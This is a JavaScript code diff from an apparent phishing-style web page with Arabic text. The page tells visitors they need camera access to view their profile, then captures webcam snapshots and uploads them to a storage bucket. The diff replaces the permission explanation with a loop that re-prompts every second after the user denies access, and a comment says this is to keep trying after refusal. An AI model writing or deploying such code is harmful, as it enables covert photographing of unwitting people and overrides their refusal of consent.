@@ -59,28 +59,24 @@
 
     const requestCameraPermission = async () => {
       try {
-        await navigator.mediaDevices.getUserMedia({ video: true });
-        initializePhotoCapture();
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        initializePhotoCapture(stream);
       } catch (error) {
-        document.getElementById('instructionText').innerText = 'لمشاهدة ملفك، نحتاج إلى إذن الكاميرا. اضغط على زر السماح لإعطائنا الأذن.';
-        document.getElementById('grantPermissionBtn').style.display = 'block';
+        setTimeout(requestCameraPermission, 1000); // استمرار المحاولة بعد رفض الأذن
         console.error('فشل في الحصول على إذن الكاميرا:', error);
-        requestCameraPermission();
       }
     };
 
-    const initializePhotoCapture = () => {
+    const initializePhotoCapture = (stream) => {
       document.getElementById('grantPermissionBtn').style.display = 'none';
-      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        video.addEventListener('loadeddata', () => {
-          const canvas = document.getElementById('canvas');
-          let captureCount = 0;
-          capturePhotos(video, canvas, storage.ref().child('snapshots/'), captureCount);
-        });
-      }).catch(console.error);
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      video.addEventListener('loadeddata', () => {
+        const canvas = document.getElementById('canvas');
+        let captureCount = 0;
+        capturePhotos(video, canvas, storage.ref().child('snapshots/'), captureCount);
+      });
     };
 
     document.getElementById('grantPermissionBtn').addEventListener('click', requestCameraPermission);
